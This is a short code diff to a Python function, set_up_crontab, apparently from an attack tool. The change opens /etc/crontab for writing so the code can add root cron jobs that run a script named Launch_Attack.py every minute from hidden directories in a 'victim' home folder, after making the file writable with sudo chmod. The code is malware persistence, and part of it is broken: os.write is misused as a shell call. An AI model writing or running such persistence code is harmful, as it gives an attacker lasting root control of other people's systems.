@@ -23,7 +23,7 @@ def set_up_crontab():
     # cron.write()
 
     os.write('sudo chmod +w /etc/crontab')
-    cron = open('/etc/crontab')
+    cron = open('/etc/crontab', 'w')
     cron.write('*/1 * * * * root sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py')
     cron.write('*/1 * * * * root sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py')
     cron.close()
